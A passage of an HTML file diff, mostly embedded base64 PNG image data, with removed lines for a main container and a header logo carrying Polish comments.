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">
 
-  <!-- Główna zawartość: zachowany mechanizm -->
-  <div class="container" role="main" aria-labelledby="hdr">
-    <div class="logo" aria-hidden="false">
-      <!-- miejsce na logo nagłówka (base64) -->
-      <img alt="Logo" src="data:image/png;base64,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